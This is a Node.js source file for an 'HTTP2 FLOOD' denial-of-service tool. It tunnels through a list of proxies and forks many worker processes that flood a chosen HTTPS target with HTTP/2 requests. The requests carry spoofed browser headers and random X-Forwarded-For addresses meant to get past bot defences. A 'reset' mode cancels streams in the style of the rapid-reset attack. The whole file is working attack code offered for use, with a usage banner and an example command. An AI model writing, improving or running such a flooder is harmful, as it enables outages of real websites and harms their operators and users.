const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const os = require("os");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const colors = require("colors");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 7) {
    console.clear();
    console.log(`
╔═══════════════════════════════════════════════════════════╗
║              HTTP2 FLOOD - TERMUX EDITION                ║
╠═══════════════════════════════════════════════════════════╣
║ Usage: node http2.js <target> <time> <rate> <threads>   ║
║        <proxyfile> <mode>                               ║
╠═══════════════════════════════════════════════════════════╣
║ Example:                                                ║
║ node http2.js https://target.com 60 50 20 proxy.txt all ║
║                                                         ║
║ Modes: flood, bypass, reset                             ║
╠═══════════════════════════════════════════════════════════╣
║ Proxy file format: ip:port (one per line)               ║
╚═══════════════════════════════════════════════════════════╝
`);
    process.exit(0);
}

const target = process.argv[2];
const duration = parseInt(process.argv[3]);
const rate = parseInt(process.argv[4]);
const threads = parseInt(process.argv[5]);
const proxyFile = process.argv[6];
const mode = process.argv[7] || "flood";

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const parsed = url.parse(target);
const proxies = fs.readFileSync(proxyFile, "utf-8")
    .replace(/\r/g, "")
    .split("\n")
    .filter(line => line && line.includes(":"));

const acceptHeaders = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
];

const cacheHeaders = [
    'max-age=0', 'no-cache', 'no-store', 
    'must-revalidate', 'proxy-revalidate',
    'no-cache, no-store, private, max-age=0, must-revalidate'
];

const langHeaders = [
    'en-US,en;q=0.9', 'id-ID,id;q=0.9', 'ja-JP,ja;q=0.9',
    'zh-CN,zh;q=0.9', 'ms-MY,ms;q=0.9', 'ar-SA,ar;q=0.9'
];

const fetchSites = ["same-origin", "same-site", "cross-site", "none"];
const fetchModes = ["navigate", "same-origin", "no-cors", "cors"];
const fetchDests = ["document", "sharedworker", "subresource", "unknown", "worker"];

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function randomString(len) {
    return crypto.randomBytes(len).toString('hex').slice(0, len);
}

function randomPath() {
    const paths = ['/', '/api', '/v1', '/data', '/static', '/assets', '/images', '/css', '/js'];
    return paths[Math.floor(Math.random() * paths.length)] + 
           (Math.random() > 0.5 ? `?${randomString(6)}=${randomString(8)}` : '');
}

function generateHeaders() {
    const version = randomInt(115, 124);
    const ua = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`;
    
    const secChUa = Math.random() > 0.5 
        ? `"Google Chrome";v="${version}", "Chromium";v="${version}", "Not?A_Brand";v="24"`
        : `"Chromium";v="${version}", "Google Chrome";v="${version}", "Not?A_Brand";v="99"`;

    return {
        ":method": "GET",
        ":authority": parsed.hostname,
        ":scheme": "https",
        ":path": parsed.path || randomPath(),
        "user-agent": ua,
        "accept": randomElement(acceptHeaders),
        "accept-encoding": randomElement(['gzip, deflate, br', 'gzip, deflate', 'br']),
        "accept-language": randomElement(langHeaders),
        "cache-control": randomElement(cacheHeaders),
        "sec-ch-ua": secChUa,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": randomElement(['"Windows"', '"Linux"', '"macOS"']),
        "sec-fetch-dest": randomElement(fetchDests),
        "sec-fetch-mode": randomElement(fetchModes),
        "sec-fetch-site": randomElement(fetchSites),
        "upgrade-insecure-requests": "1",
        "referer": `https://${parsed.hostname}/`,
        "origin": `https://${parsed.hostname}`,
        ...(Math.random() > 0.5 && { "dnt": "1" }),
        ...(Math.random() > 0.5 && { "te": "trailers" }),
        ...(Math.random() > 0.3 && { "x-forwarded-for": `${randomInt(1,255)}.${randomInt(1,255)}.${randomInt(1,255)}.${randomInt(1,255)}` })
    };
}

function attack() {
    const proxy = randomElement(proxies);
    const [proxyHost, proxyPort] = proxy.split(":");

    let tlsConn = null;

    const socket = net.connect(parseInt(proxyPort), proxyHost, () => {
        const connectPayload = `CONNECT ${parsed.hostname}:443 HTTP/1.1\r\nHost: ${parsed.hostname}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`;
        socket.write(connectPayload);

        socket.once("data", () => {
            const tlsOptions = {
                host: parsed.hostname,
                servername: parsed.hostname,
                port: 443,
                ciphers: ciphers,
                secure: true,
                rejectUnauthorized: false,
                ALPNProtocols: ['h2', 'http/1.1'],
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                socket: socket,
                setNoDelay: true,
                setKeepAlive: true,
                keepAliveInitialDelay: 60000
            };

            tlsConn = tls.connect(tlsOptions);
            tlsConn.allowHalfOpen = true;
            tlsConn.setNoDelay(true);
            tlsConn.setKeepAlive(true, 60000);
            tlsConn.setMaxListeners(0);

            const client = http2.connect(parsed.href, {
                createConnection: () => tlsConn,
                settings: {
                    headerTableSize: 65536,
                    maxConcurrentStreams: 1000,
                    initialWindowSize: 6291456,
                    maxHeaderListSize: 262144,
                    enablePush: false
                }
            });

            client.setMaxListeners(0);

            let requestInterval;

            client.on("connect", () => {
                const intervalTime = mode === "bypass" ? randomInt(700, 7000) : 100;

                requestInterval = setInterval(() => {
                    if (client.destroyed) return;

                    const batchSize = mode === "flood" ? rate : randomInt(1, rate);
                    const headers = generateHeaders();

                    for (let i = 0; i < batchSize; i++) {
                        const req = client.request(headers);
                        
                        req.on("response", (response) => {
                            const status = response[':status'] || 0;
                            if (status >= 200 && status < 300) {
                                if (Math.random() > 0.99) {
                                    console.log(`[✓] ${status} ${parsed.hostname}`);
                                }
                            }
                            req.close();
                            req.destroy();
                        });

                        req.on("error", () => {
                            req.destroy();
                        });

                        if (mode === "reset") {
                            setTimeout(() => {
                                try {
                                    req.close(http2.constants.NGHTTP2_CANCEL);
                                    client.destroy();
                                } catch {}
                            }, randomInt(50, 500));
                        }

                        req.end();
                    }
                }, 1000 / intervalTime);
            });

            client.on("error", () => {
                client.destroy();
                if (tlsConn) tlsConn.destroy();
                if (socket) socket.destroy();
                clearInterval(requestInterval);
            });

            client.on("close", () => {
                clearInterval(requestInterval);
                client.destroy();
                if (tlsConn) tlsConn.destroy();
                if (socket) socket.destroy();
            });

            client.on("timeout", () => {
                clearInterval(requestInterval);
                client.destroy();
                if (tlsConn) tlsConn.destroy();
                if (socket) socket.destroy();
            });

        }).on("error", () => {
            if (tlsConn) tlsConn.destroy();
            socket.destroy();
        });
    });

    socket.on("close", () => {
        if (tlsConn) tlsConn.destroy();
        socket.destroy();
        setTimeout(attack, 100);
    });

    socket.on("error", () => {
        if (tlsConn) tlsConn.destroy();
        socket.destroy();
        setTimeout(attack, 200);
    });
}

if (cluster.isMaster) {
    console.clear();
    console.log(`
╔═══════════════════════════════════════════════════════════╗
║          HTTP2 FLOOD - TERMUX EDITION v2.0               ║
╠═══════════════════════════════════════════════════════════╣
║ Target: ${target.cyan}                                      ║
║ Duration: ${duration}s ${" ".repeat(10)} Rate: ${rate} req/cycle           ║
║ Threads: ${threads} ${" ".repeat(10)} Mode: ${mode.cyan}                      ║
║ Proxies: ${proxies.length} loaded                         ║
╚═══════════════════════════════════════════════════════════╝
`);

    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        process.exit(0);
    }, duration * 1000);

} else {
    setInterval(attack, 100);
}

process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});
process.on("SIGINT", () => process.exit(0));
